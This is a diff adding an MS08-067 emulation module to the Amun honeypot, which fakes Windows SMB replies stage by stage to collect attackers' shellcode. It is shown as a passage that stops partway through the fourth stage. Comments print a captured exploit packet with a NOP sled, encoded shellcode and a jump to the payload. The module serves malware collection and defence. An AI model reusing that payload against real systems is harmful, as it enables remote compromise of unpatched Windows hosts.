@@ -1,0 +1,1059 @@
+"""
+[Amun - low interaction honeypot]
+Copyright (C) [2008]  [Jan Goebel]
+
+This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation; either version 2 of the License, or (at your option) any later version.
+
+This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.
+
+You should have received a copy of the GNU General Public License along with this program; if not, see <http://www.gnu.org/licenses/>
+"""
+
+import psyco ; psyco.full()
+from psyco.classes import *
+
+import struct
+import random
+import ms08067_shellcodes
+
+import amun_logging
+
+### Modul to analyze new vulnerabilities, get everything send to a port and send it to shellcode_manager
+
+class vuln:
+	def __init__(self):
+		try:
+			self.vuln_name = "MS08067 Vulnerability"
+			self.stage = "MS08067_STAGE1"
+			self.welcome_message = ""
+			self.shellcode = []
+		except KeyboardInterrupt:
+			raise
+
+	def print_message(self, data):
+		print "\n"
+		counter = 1
+		for byte in data:
+			if counter==16:
+				ausg = hex(struct.unpack("B",byte)[0])
+				if len(ausg) == 3:
+					list = str(ausg).split("x")
+					ausg = "%sx0%s" % (list[0],list[1])
+					print ausg
+				else:
+					print ausg
+				counter = 0
+			else:
+				ausg = hex(struct.unpack("B",byte)[0])
+				if len(ausg) == 3:
+					list = str(ausg).split("x")
+					ausg = "%sx0%s" % (list[0],list[1])
+					print ausg,
+				else:
+					print ausg,
+			counter += 1
+		print "\n>> Incoming Codesize: %s\n\n" % (len(data))
+
+	def getVulnName(self):
+		return self.vuln_name
+
+	def getCurrentStage(self):
+		return self.stage
+
+	def getWelcomeMessage(self):
+		return self.welcome_message
+
+	def incoming(self, message, bytes, ip, vuLogger, random_reply):
+		try:
+			self.log_obj = amun_logging.amun_logging("vuln_analyzer", vuLogger)
+
+			### construct standard reply
+			#self.reply = random_reply
+			self.reply = []
+			for i in range(0,185):
+				try:
+					self.reply.append( struct.pack("B", 0) )
+				except KeyboardInterrupt:
+					raise
+
+			### SMB Negotiate Request
+			### 0x00 0x00 0x00 0x2f 0xff 0x53 0x4d 0x42 0x72 0x00 0x00 0x00 0x00 0x00 0x00 0x00
+			### 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0xcf 0x6b
+			### 0x00 0x00 0x00 0x00 0x00 0x0c 0x00 0x02 0x4e 0x54 0x20 0x4c 0x4d 0x20 0x30 0x2e
+			### 0x31 0x32 0x00
+			
+			### SMB Setup and X Request
+			### 0x00 0x00 0x00 0x4b 0xff 0x53 0x4d 0x42 0x73 0x00 0x00 0x00 0x00 0x08 0x00 0x00
+			### 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0xff 0xff 0x49 0x68
+			### 0x00 0x00 0x00 0x00 0x0d 0xff 0x00 0x00 0x00 0xff 0xff 0x02 0x00 0x49 0x68 0x00
+			### 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x01 0x00 0x00 0x00 0x0e
+			### 0x00 0x00 0x00 0x70 0x6f 0x73 0x69 0x78 0x00 0x70 0x79 0x73 0x6d 0x62 0x00
+
+			### incoming setup x request
+			### 0x00 0x00 0x00 0x49 0xff 0x53 0x4d 0x42 0x73 0x00 0x00 0x00 0x00 0x00 0x00 0x00
+			### 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x5c 0x02
+			### 0x00 0x00 0x00 0x00 0x0d 0xff 0x00 0x00 0x00 0xff 0xff 0x02 0x00 0x5c 0x02 0x00
+			### 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x01 0x00 0x00 0x00 0x0b
+			### 0x00 0x00 0x00 0x4e 0x54 0x00 0x4c 0x41 0x4e 0x4d 0x41 0x4e 0x00
+
+			### Tree Connect AndX Request
+			### 0x00 0x00 0x00 0x44 0xff 0x53 0x4d 0x42 0x75 0x00 0x00 0x00 0x00 0x08 0x00 0x00
+			### 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0xff 0xff 0xfa 0x0d
+			### 0x00 0x08 0x00 0x00 0x04 0xff 0x00 0x00 0x00 0x00 0x00 0x01 0x00 0x19 0x00 0x00
+			### 0x5c 0x5c 0x2a 0x53 0x4d 0x42 0x53 0x45 0x52 0x56 0x45 0x52 0x5c 0x49 0x50 0x43
+			### 0x24 0x00 0x3f 0x3f 0x3f 0x3f 0x3f 0x00
+
+			### NT Create User
+			### 0x00 0x00 0x00 0x5c 0xff 0x53 0x4d 0x42 0xa2 0x00 0x00 0x00 0x00 0x18 0x01 0x00
+			### 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0xff 0xff 0x64 0x10
+			### 0x00 0x08 0x00 0x00 0x18 0xff 0x00 0x00 0x00 0x00 0x08 0x00 0x16 0x00 0x00 0x00
+			### 0x00 0x00 0x00 0x00 0x9f 0x01 0x02 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
+			### 0x00 0x00 0x00 0x00 0x03 0x00 0x00 0x00 0x01 0x00 0x00 0x00 0x40 0x00 0x00 0x00
+			### 0x02 0x00 0x00 0x00 0x03 0x09 0x00 0x5c 0x62 0x72 0x6f 0x77 0x73 0x65 0x72 0x00
+
+			### bind call (trans)
+			### 0x00 0x00 0x00 0x92 0xff 0x53 0x4d 0x42 0x25 0x00 0x00 0x00 0x00 0x08 0x01 0x00
+			### 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0xff 0xff 0x83 0x14
+			### 0x00 0x08 0x00 0x00 0x10 0x00 0x00 0x48 0x00 0x00 0x04 0xe0 0xff 0x00 0x00 0x00
+			### 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x4a 0x00 0x48 0x00 0x4a 0x00 0x02
+			### 0x00 0x26 0x00 0x08 0x40 0x4f 0x00 0x5c 0x50 0x49 0x50 0x45 0x5c 0x00 0x05 0x00
+			### 0x0b 0x03 0x10 0x00 0x00 0x00 0x48 0x00 0x00 0x00 0x01 0x00 0x00 0x00 0xb8 0x10
+			### 0xb8 0x10 0x00 0x00 0x00 0x00 0x01 0x00 0x00 0x00 0x00 0x00 0x01 0x00 0xc8 0x4f
+			### 0x32 0x4b 0x70 0x16 0xd3 0x01 0x12 0x78 0x5a 0x47 0xbf 0x6e 0xe1 0x88 0x03 0x00
+			### 0x00 0x00 0x04 0x5d 0x88 0x8a 0xeb 0x1c 0xc9 0x11 0x9f 0xe8 0x08 0x00 0x2b 0x10
+			### 0x48 0x60 0x02 0x00 0x00 0x00
+
+			### shellcode
+			### 0x00 0x00 0x02 0xa6 0xff 0x53 0x4d 0x42 0x25 0x00 0x00 0x00 0x00 0x08 0x01 0x00
+			### 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0xff 0xff 0xe3 0x16
+			### 0x00 0x08 0x00 0x00 0x10 0x00 0x00 0x5c 0x02 0x00 0x04 0xe0 0xff 0x00 0x00 0x00
+			### 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x4a 0x00 0x5c 0x02 0x4a 0x00 0x02
+			### 0x00 0x26 0x00 0x08 0x40 0x63 0x02 0x5c 0x50 0x49 0x50 0x45 0x5c 0x00 0x05 0x00
+			### 0x00 0x03 0x10 0x00 0x00 0x00 0x5c 0x02 0x00 0x00 0x01 0x00 0x00 0x00 0x44 0x02
+			### 0x00 0x00 0x00 0x00 0x1f 0x00 0x01 0x00 0x00 0x00 0xd6 0x00 0x00 0x00 0x00 0x00
+			### 0x00 0x00 0xd6 0x00 0x00 0x00 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
+			### 0x90 0x90 0x90 0x90 0x90 0x90 0x29 0xc9 0x83 0xe9 0xb0 0xe8 0xff 0xff 0xff 0xff
+			### 0xc0 0x5e 0x81 0x76 0x0e 0xe9 0x4a 0xb6 0xa9 0x83 0xee 0xfc 0xe2 0xf4 0x15 0x20
+			### 0x5d 0xe4 0x01 0xb3 0x49 0x56 0x16 0x2a 0x3d 0xc5 0xcd 0x6e 0x3d 0xec 0xd5 0xc1
+			### 0xca 0xac 0x91 0x4b 0x59 0x22 0xa6 0x52 0x3d 0xf6 0xc9 0x4b 0x5d 0xe0 0x62 0x7e
+			### 0x3d 0xa8 0x07 0x7b 0x76 0x30 0x45 0xce 0x76 0xdd 0xee 0x8b 0x7c 0xa4 0xe8 0x88
+			### 0x5d 0x5d 0xd2 0x1e 0x92 0x81 0x9c 0xaf 0x3d 0xf6 0xcd 0x4b 0x5d 0xcf 0x62 0x46
+			### 0xfd 0x22 0xb6 0x56 0xb7 0x42 0xea 0x66 0x3d 0x20 0x85 0x6e 0xaa 0xc8 0x2a 0x7b
+			### 0x6d 0xcd 0x62 0x09 0x86 0x22 0xa9 0x46 0x3d 0xd9 0xf5 0xe7 0x3d 0xe9 0xe1 0x14
+			### 0xde 0x27 0xa7 0x44 0x5a 0xf9 0x16 0x9c 0xd0 0xfa 0x8f 0x22 0x85 0x9b 0x81 0x3d
+			### 0xc5 0x9b 0xb6 0x1e 0x49 0x79 0x81 0x81 0x5b 0x55 0xd2 0x1a 0x49 0x7f 0xb6 0xc3
+			### 0x53 0xcf 0x68 0xa7 0xbe 0xab 0xbc 0x20 0xb4 0x56 0x39 0x22 0x6f 0xa0 0x1c 0xe7
+			### 0xe1 0x56 0x3f 0x19 0xe5 0xfa 0xba 0x19 0xf5 0xfa 0xaa 0x19 0x49 0x79 0x8f 0x22
+			### 0xa7 0xf5 0x8f 0x19 0x3f 0x48 0x7c 0x22 0x12 0xb3 0x99 0x8d 0xe1 0x56 0x3f 0x20
+			### 0xa6 0xf8 0xbc 0xb5 0x66 0xc1 0x4d 0xe7 0x98 0x40 0xbe 0xb5 0x60 0xfa 0xbc 0xb5
+			### 0x66 0xc1 0x0c 0x03 0x30 0xe0 0xbe 0xb5 0x60 0xf9 0xbd 0x1e 0xe3 0x56 0x39 0xd9
+			### 0xde 0x4e 0x90 0x8c 0xcf 0xfe 0x16 0x9c 0xe3 0x56 0x39 0x2c 0xdc 0xcd 0x8f 0x22
+			### 0xd5 0xc4 0x60 0xaf 0xdc 0xf9 0xb0 0x63 0x7a 0x20 0x0e 0x20 0xf2 0x20 0x0b 0x7b
+			### 0x76 0x5a 0x43 0xb4 0xf4 0x84 0x17 0x08 0x9a 0x3a 0x64 0x30 0x8e 0x02 0x42 0xe1
+			### 0xde 0xdb 0x17 0xf9 0xa0 0x56 0x9c 0x0e 0x49 0x7f 0xb2 0x1d 0xe4 0xf8 0xb8 0x1b
+			### 0xdc 0xa8 0xb8 0x1b 0xe3 0xf8 0x16 0x9a 0xde 0x04 0x30 0x4f 0x78 0xfa 0x16 0x9c
+			### 0xdc 0x56 0x16 0x7d 0x49 0x79 0x62 0x1d 0x4a 0x2a 0x2d 0x2e 0x49 0x7f 0xbb 0xb5
+			### 0x66 0xc1 0x19 0xc0 0xb2 0xf6 0xba 0xb5 0x60 0x56 0x39 0x4a 0xb6 0xa9 0x41 0x41
+			### 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41
+			### 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41
+			### 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41
+			### 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x00 0x00
+			### 0x00 0x00 0x2f 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x2f 0x00 0x00 0x00 0x41 0x00
+			### 0x5c 0x00 0x2e 0x00 0x2e 0x00 0x5c 0x00 0x2e 0x00 0x2e 0x00 0x5c 0x00 0x41 0x41
+			### 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41
+			### 0x2f 0x68 0x18 0x00 0x8b 0xc4 0x66 0x05 0x94 0x04 0x8b 0x00 0xff 0xe0 0x43 0x43
+			### 0x43 0x43 0x43 0x43 0x43 0x43 0x43 0x43 0x43 0x43 0x43 0x43 0x43 0x43 0x43 0x43
+			### 0x43 0x43 0x43 0x43 0x43 0x43 0x43 0x43 0x43 0x43 0x43 0x43 0x43 0x43 0x43 0x43
+			### 0x43 0x43 0x43 0x43 0x43 0x43 0xeb 0xcc 0x00 0x00 0x00 0x00 0x00 0x00 0x02 0x00
+			### 0x00 0x00 0x02 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x02 0x00 0x00 0x00 0x5c 0x00
+			### 0x00 0x00 0x01 0x00 0x00 0x00 0x01 0x00 0x00 0x00
+
+
+			### prepare default resultSet
+			resultSet = {}
+			resultSet["vulnname"] = self.vuln_name
+			resultSet["accept"] = False
+			resultSet["result"] = False
+			resultSet["shutdown"] = False
+			resultSet["reply"] = "None"
+			resultSet["stage"] = self.stage
+			resultSet["shellcode"] = "None"
+			resultSet["isFile"] = False
+
+			if self.stage == "MS08067_STAGE1" and bytes==51:
+				if message[8]!='\x72':
+					return resultSet
+				print ".::[Amun - MS08-067 STAGE1] collecting shellcode (bytes %s ip %s) ::." % (bytes,ip)
+				#print message
+				#print ">> Request:"
+				#self.print_message(message)
+				resultSet["result"] = True
+				resultSet["accept"] = True
+				### netbios header
+				self.reply[0] = "\x00"
+				self.reply[1] = "\x00"
+				self.reply[2] = "\x00"
+				### size - 4 kuerzer
+				self.reply[3] = "\xb3"
+				### ff
+				self.reply[4] = "\xff"
+				## SMB
+				self.reply[5] = "\x53"
+				self.reply[6] = "\x4d"
+				self.reply[7] = "\x42"
+				### command (dialect name)
+				self.reply[8] = "\x72"
+				### error class
+				self.reply[9] = "\x00"
+				### reserved
+				self.reply[10] = "\x00"
+				### error code
+				self.reply[11] = "\x00"
+				self.reply[12] = "\x00"
+				### flag
+				self.reply[13] = "\x08"
+				### flag2
+				self.reply[14] = "\x00"
+				self.reply[15] = "\x00"
+				### extra
+				self.reply[16] = "\x00"
+				self.reply[17] = "\x00"
+				self.reply[18] = "\x00"
+				self.reply[19] = "\x00"
+				self.reply[20] = "\x00"
+				self.reply[21] = "\x00"
+				self.reply[22] = "\x00"
+				self.reply[23] = "\x00"
+				self.reply[24] = "\x00"
+				self.reply[25] = "\x00"
+				self.reply[26] = "\x00"
+				self.reply[27] = "\x00"
+				### tree ID
+				self.reply[28] = "\x00"
+				self.reply[29] = "\x00"
+				### pid
+				self.reply[30] = message[30]
+				self.reply[31] = message[31]
+				### uid
+				self.reply[32] = "\x00"
+				self.reply[33] = "\x00"
+				### mid
+				self.reply[34] = "\x00"
+				self.reply[35] = "\x00"
+				### word count
+				self.reply[36] = "\x11"
+				###### parameter block
+				### dialect
+				self.reply[37] = "\x07"
+				self.reply[38] = "\x00"
+				### securityMode
+				self.reply[39] = "\x00"
+				### max mpx count
+				self.reply[40] = "\x32"
+				self.reply[41] = "\x00"
+				### max vcs
+				self.reply[42] = "\x01"
+				self.reply[43] = "\x00"
+				### max buffer size
+				self.reply[44] = "\x04"
+				self.reply[45] = "\x41"
+				self.reply[46] = "\x00"
+				self.reply[47] = "\x00"
+				### max raw
+				self.reply[48] = "\x00"
+				self.reply[49] = "\x00"
+				self.reply[50] = "\x01"
+				self.reply[51] = "\x00"
+				### session key
+				self.reply[52] = "\x2a"
+				self.reply[53] = "\x2a"
+				self.reply[54] = "\x2a"
+				self.reply[55] = "\x2a"
+				### capabilities
+				self.reply[56] = "\xfd"
+				self.reply[57] = "\xf3"
+				self.reply[58] = "\x01"
+				self.reply[59] = "\x80"
+				### system time high
+				self.reply[60] = "\xb2"
+				self.reply[61] = "\xbf"
+				self.reply[62] = "\x45"
+				self.reply[63] = "\xc0"
+				self.reply[64] = "\x79"
+				self.reply[65] = "\x3e"
+				self.reply[66] = "\xc9"
+				self.reply[67] = "\x01"
+				### server time zone
+				self.reply[68] = "\x20"
+				self.reply[69] = "\xfe"
+				### encryptedkey lenght
+				self.reply[70] = "\x00"
+				### byte count
+				self.reply[71] = "\x6e"
+				self.reply[72] = "\x00"
+				### bytes server guid
+				self.reply[73] = "\x07"
+				self.reply[74] = "\x0f"
+				self.reply[75] = "\xb1"
+				self.reply[76] = "\x22"
+				self.reply[77] = "\xc5"
+				self.reply[78] = "\x22"
+				self.reply[79] = "\x47"
+				self.reply[80] = "\x4d"
+				self.reply[81] = "\x82"
+				self.reply[82] = "\x22"
+				self.reply[83] = "\x02"
+				self.reply[84] = "\x9d"
+				self.reply[85] = "\x67"
+				self.reply[86] = "\xd7"
+				self.reply[87] = "\x82"
+				self.reply[88] = "\x7d"
+				#### security blob 
+				self.reply[89] = "\x60"
+				self.reply[90] = "\x5c"
+				self.reply[91] = "\x06"
+				self.reply[92] = "\x06"
+				### oid
+				self.reply[93] = "\x2b"
+				self.reply[94] = "\x06"
+				self.reply[95] = "\x01"
+				self.reply[96] = "\x05"
+				self.reply[97] = "\x05"
+				self.reply[98] = "\x02"
+				### spnego
+				self.reply[99] = "\xa0"
+				self.reply[100] = "\x52"
+				self.reply[101] = "\x30"
+				self.reply[102] = "\x50"
+				self.reply[103] = "\xa0"
+				self.reply[104] = "\x30"
+				self.reply[105] = "\x30"
+				self.reply[106] = "\x2e"
+				self.reply[107] = "\x06"
+				self.reply[108] = "\x09"
+				### item 1
+				self.reply[109] = "\x2a"
+				self.reply[110] = "\x86"
+				self.reply[111] = "\x48"
+				self.reply[112] = "\x82"
+				self.reply[113] = "\xf7"
+				self.reply[114] = "\x12"
+				self.reply[115] = "\x01"
+				self.reply[116] = "\x02"
+				self.reply[117] = "\x02"
+				###
+				self.reply[118] = "\x06"
+				self.reply[119] = "\x09"
+				### item 2
+				self.reply[120] = "\x2a"
+				self.reply[121] = "\x86"
+				self.reply[122] = "\x48"
+				self.reply[123] = "\x86"
+				self.reply[124] = "\xf7"
+				self.reply[125] = "\x12"
+				self.reply[126] = "\x01"
+				self.reply[127] = "\x02"
+				self.reply[128] = "\x02"
+				###
+				self.reply[129] = "\x06"
+				self.reply[130] = "\x0a"
+				### item 3
+				self.reply[131] = "\x2a"
+				self.reply[132] = "\x86"
+				self.reply[133] = "\x48"
+				self.reply[134] = "\x86"
+				self.reply[135] = "\xf7"
+				self.reply[136] = "\x12"
+				self.reply[137] = "\x01"
+				self.reply[138] = "\x02"
+				self.reply[139] = "\x02"
+				self.reply[140] = "\x03"
+				###
+				self.reply[141] = "\x06"
+				self.reply[142] = "\x0a"
+				### item 4
+				self.reply[143] = "\x2b"
+				self.reply[144] = "\x06"
+				self.reply[145] = "\x01"
+				self.reply[146] = "\x04"
+				self.reply[147] = "\x01"
+				self.reply[148] = "\x82"
+				self.reply[149] = "\x37"
+				self.reply[150] = "\x02"
+				self.reply[151] = "\x02"
+				self.reply[152] = "\x0a"
+				###
+				self.reply[153] = "\xa3"
+				self.reply[154] = "\x1c"
+				### principal
+				self.reply[155] = "\x30"
+				self.reply[156] = "\x1a"
+				self.reply[157] = "\xa0"
+				self.reply[158] = "\x18"
+				self.reply[159] = "\x1b"
+				self.reply[160] = "\x16"
+				###
+				self.reply[161] = "\x66"
+				self.reply[162] = "\x73"
+				self.reply[163] = "\x31"
+				self.reply[164] = "\x24"
+				self.reply[165] = "\x40"
+				self.reply[166] = "\x43"
+				self.reply[167] = "\x41"
+				self.reply[168] = "\x52"
+				self.reply[169] = "\x4c"
+				self.reply[170] = "\x49"
+				self.reply[171] = "\x4e"
+				self.reply[172] = "\x47"
+				self.reply[173] = "\x54"
+				self.reply[174] = "\x4f"
+				self.reply[175] = "\x4e"
+				self.reply[176] = "\x2e"
+				self.reply[177] = "\x43"
+				self.reply[178] = "\x4f"
+				self.reply[179] = "\x4d"
+				self.reply[180] = "\x2e"
+				self.reply[181] = "\x54"
+				self.reply[182] = "\x57"
+
+				#print "<< Response:"
+				#self.print_message(self.reply[:183])
+				resultSet['reply'] = "".join(self.reply[:183])
+				self.stage = "MS08067_STAGE2"
+				return resultSet
+			elif self.stage == "MS08067_STAGE2" and (bytes==79 or bytes==77):
+				print ".::[Amun - MS08-067 STAGE2] collecting shellcode (bytes %s ip %s) ::." % (bytes,ip)
+				print ">> Request:"
+				self.print_message(message)
+				resultSet["result"] = True
+				resultSet["accept"] = True
+				### netbios header
+				self.reply[0] = "\x00"
+				self.reply[1] = "\x00"
+				self.reply[2] = "\x00"
+				### size -4
+				self.reply[3] = "\x61"
+				### smb header
+				self.reply[4] = "\xff"
+				self.reply[5] = "\x53"
+				self.reply[6] = "\x4d"
+				self.reply[7] = "\x42"
+				### command (dialect name)
+				self.reply[8] = "\x73"
+				### error class
+				self.reply[9] = "\x00"
+				### reserved
+				self.reply[10] = "\x00"
+				### error code
+				self.reply[11] = "\x00"
+				self.reply[12] = "\x00"
+				### flag
+				#self.reply[13] = "\x98"
+				self.reply[13] = "\x08"
+				### flag2
+				#self.reply[14] = "\x01"
+				#self.reply[15] = "\x20"
+				self.reply[14] = "\x00"
+				self.reply[15] = "\x00"
+				### extra
+				self.reply[16] = "\x00"
+				self.reply[17] = "\x00"
+				self.reply[18] = "\x00"
+				self.reply[19] = "\x00"
+				self.reply[20] = "\x00"
+				self.reply[21] = "\x00"
+				self.reply[22] = "\x00"
+				self.reply[23] = "\x00"
+				self.reply[24] = "\x00"
+				self.reply[25] = "\x00"
+				self.reply[26] = "\x00"
+				self.reply[27] = "\x00"
+				### tree ID
+				#self.reply[28] = message[28]
+				#self.reply[29] = message[29]
+				self.reply[28] = "\x00"
+				self.reply[29] = "\x00"
+				### pid
+				self.reply[30] = message[30]
+				self.reply[31] = message[31]
+				### uid
+				self.reply[32] = "\x10"
+				self.reply[33] = "\x08"
+				### mid
+				self.reply[34] = message[34]
+				self.reply[35] = message[35]
+				### word count
+				self.reply[36] = "\x04"
+				###### parameter block
+				### andxcommand
+				self.reply[37] = "\xff"
+				### reserved
+				self.reply[38] = "\x00"
+				### anxoffset
+				self.reply[39] = "\x00"
+				self.reply[40] = "\x00"
+				### action
+				self.reply[41] = "\x01"
+				self.reply[42] = "\x00"
+				### security blob length
+				self.reply[43] = "\x09"
+				self.reply[44] = "\x00"
+				### byte count
+				self.reply[45] = "\x2d"
+				self.reply[46] = "\x00"
+				### bytes
+				self.reply[47] = "\xa1"
+				self.reply[48] = "\x07"
+				self.reply[49] = "\x30"
+				self.reply[50] = "\x05"
+				self.reply[51] = "\xa0"
+				self.reply[52] = "\x03"
+				self.reply[53] = "\x0a"
+				self.reply[54] = "\x01"
+				self.reply[55] = "\x00"
+				###
+				self.reply[56] = "\x57"
+				self.reply[57] = "\x69"
+				self.reply[58] = "\x6e"
+				self.reply[59] = "\x64"
+				self.reply[60] = "\x6f"
+				self.reply[61] = "\x77"
+				self.reply[62] = "\x73"
+				self.reply[63] = "\x20"
+				self.reply[64] = "\x32"
+				self.reply[65] = "\x30"
+				self.reply[66] = "\x30"
+				self.reply[67] = "\x30"
+				self.reply[68] = "\x20"
+				self.reply[69] = "\x32" # 2
+				self.reply[70] = "\x31" # 1
+				self.reply[71] = "\x39" # 9
+				self.reply[72] = "\x35" # 5
+				###
+				self.reply[73] = "\x00"
+				self.reply[74] = "\x57"
+				self.reply[75] = "\x69"
+				self.reply[76] = "\x6e"
+				self.reply[77] = "\x64"
+				self.reply[78] = "\x6f"
+				self.reply[79] = "\x77"
+				self.reply[80] = "\x73"
+				self.reply[81] = "\x20"
+				self.reply[82] = "\x32"
+				self.reply[83] = "\x30"
+				self.reply[84] = "\x30"
+				self.reply[85] = "\x30"
+				self.reply[86] = "\x20"
+				self.reply[87] = "\x35"
+				###
+				self.reply[88] = "\x2e"
+				self.reply[89] = "\x30"
+				self.reply[90] = "\x00"
+				self.reply[91] = "\x57"
+				self.reply[92] = "\x4f"
+				self.reply[93] = "\x52"
+				self.reply[94] = "\x4b"
+				self.reply[95] = "\x47"
+				self.reply[96] = "\x52"
+				self.reply[97] = "\x4f"
+				self.reply[98] = "\x55"
+				self.reply[99] = "\x50"
+				self.reply[100] = "\x00"
+				###
+
+				resultSet['reply'] = "".join(self.reply[2:101])
+				print "<< Response:"
+				self.print_message(self.reply[:101])
+				print self.reply[:101]
+				self.stage = "MS08067_STAGE3"
+				return resultSet
+			elif self.stage == "MS08067_STAGE3" and (bytes==72):
+				print ".::[Amun - MS08-067 STAGE3] collecting shellcode (bytes %s ip %s) ::." % (bytes,ip)
+				resultSet["result"] = True
+				resultSet["accept"] = True
+				#print ">> Request:"
+				#self.print_message(message)
+				### netbios header
+				self.reply[0] = "\x00"
+				self.reply[1] = "\x00"
+				self.reply[2] = "\x00"
+				### size -4
+				self.reply[3] = "\x38"
+				### smb header
+				self.reply[4] = "\xff"
+				self.reply[5] = "\x53"
+				self.reply[6] = "\x4d"
+				self.reply[7] = "\x42"
+				### command (dialect name)
+				self.reply[8] = "\x75"
+				### error class
+				self.reply[9] = "\x00"
+				### reserved
+				self.reply[10] = "\x00"
+				### error code
+				self.reply[11] = "\x00"
+				self.reply[12] = "\x00"
+				### flag
+				self.reply[13] = "\x98"
+				### flag2
+				self.reply[14] = "\x01"
+				self.reply[15] = "\x20"
+				### extra
+				self.reply[16] = "\x00"
+				self.reply[17] = "\x00"
+				self.reply[18] = "\x00"
+				self.reply[19] = "\x00"
+				self.reply[20] = "\x00"
+				self.reply[21] = "\x00"
+				self.reply[22] = "\x00"
+				self.reply[23] = "\x00"
+				self.reply[24] = "\x00"
+				self.reply[25] = "\x00"
+				self.reply[26] = "\x00"
+				self.reply[27] = "\x00"
+				### tree ID
+				self.reply[28] = message[28]
+				self.reply[29] = message[29]
+				### pid
+				self.reply[30] = message[30]
+				self.reply[31] = message[31]
+				### uid
+				self.reply[32] = "\x00"
+				self.reply[33] = "\x08"
+				### mid
+				self.reply[34] = message[34]
+				self.reply[35] = message[35]
+				### word count
+				self.reply[36] = "\x07"
+				###### parameter block
+				### andxcommand
+				self.reply[37] = "\xff"
+				### reserved
+				self.reply[38] = "\x00"
+				### anxoffset
+				self.reply[39] = "\x38"
+				self.reply[40] = "\x00"
+				### action
+				self.reply[41] = "\x01"
+				self.reply[42] = "\x00"
+				### word parameter
+				self.reply[43] = "\xff"
+				self.reply[44] = "\x01"
+				###
+				self.reply[45] = "\x00"
+				self.reply[46] = "\x00"
+				###
+				self.reply[47] = "\xff"
+				self.reply[48] = "\x01"
+				###
+				self.reply[49] = "\x00"
+				self.reply[50] = "\x00"
+				### byte count
+				self.reply[51] = "\x07"
+				self.reply[52] = "\x00"
+				### bytes
+				self.reply[53] = "\x49"
+				self.reply[54] = "\x50"
+				self.reply[55] = "\x43"
+				self.reply[56] = "\x00"
+				self.reply[57] = "\x00"
+				self.reply[58] = "\x00"
+				self.reply[59] = "\x00"
+				resultSet['reply'] = "".join(self.reply[2:60])
+				self.stage = "MS08067_STAGE4"
+				return resultSet
+			elif self.stage == "MS08067_STAGE4" and bytes==96:
+				print ".::[Amun - MS08-067 STAGE4] collecting shellcode (bytes %s ip %s) ::." % (bytes,ip)
+				#print ">> Request:"
+				#self.print_message(message)
+				resultSet["result"] = True
+				resultSet["accept"] = True
+				### netbios header
+				self.reply[0] = "\x00"
+				self.reply[1] = "\x00"
+				self.reply[2] = "\x00"
+				### size -4
+				self.reply[3] = "\x86"
+				### smb header
+				self.reply[4] = "\xff"
+				self.reply[5] = "\x53"
+				self.reply[6] = "\x4d"
+				self.reply[7] = "\x42"
+				### command (dialect name)
+				self.reply[8] = "\xa2"
+				### error class
+				self.reply[9] = "\x00"
+				### reserved
+				self.reply[10] = "\x00"
+				### error code
+				self.reply[11] = "\x00"
+				self.reply[12] = "\x00"
+				### flag
+				self.reply[13] = "\x98"
+				### flag2
+				self.reply[14] = "\x01"
+				self.reply[15] = "\x20"
+				### extra
+				self.reply[16] = "\x00"
+				self.reply[17] = "\x00"
+				self.reply[18] = "\x00"
+				self.reply[19] = "\x00"
+				self.reply[20] = "\x00"
+				self.reply[21] = "\x00"
+				self.reply[22] = "\x00"
+				self.reply[23] = "\x00"
+				self.reply[24] = "\x00"
+				self.reply[25] = "\x00"
+				self.reply[26] = "\x00"
+				self.reply[27] = "\x00"
+				### tree ID
+				self.reply[28] = message[28]
+				self.reply[29] = message[29]
+				### pid
+				self.reply[30] = message[30]
+				self.reply[31] = message[31]
+				### uid
+				self.reply[32] = "\x00"
+				self.reply[33] = "\x08"
+				### mid
+				self.reply[34] = message[34]
+				self.reply[35] = message[35]
+				### word count
+				self.reply[36] = "\x2a"
+				###### parameter block
+				### andxcommand
+				self.reply[37] = "\xff"
+				### reserved
+				self.reply[38] = "\x00"
+				### anxoffset
+				self.reply[39] = "\x87"
+				self.reply[40] = "\x00"
+				### oplock level
+				self.reply[41] = "\x00"
+				### file id
+				self.reply[42] = "\x08"
+				self.reply[43] = "\x40"
+				### create action
+				self.reply[44] = "\x01"
+				self.reply[45] = "\x00"
+				self.reply[46] = "\x00"
+				self.reply[47] = "\x00"
+				### created
+				self.reply[48] = "\x00"
+				self.reply[49] = "\x00"
+				self.reply[50] = "\x00"
+				self.reply[51] = "\x00"
+				self.reply[52] = "\x00"
+				self.reply[53] = "\x00"
+				self.reply[54] = "\x00"
+				self.reply[55] = "\x00"
+				### last access
+				self.reply[56] = "\x00"
+				self.reply[57] = "\x00"
+				self.reply[58] = "\x00"
+				self.reply[59] = "\x00"
+				self.reply[60] = "\x00"
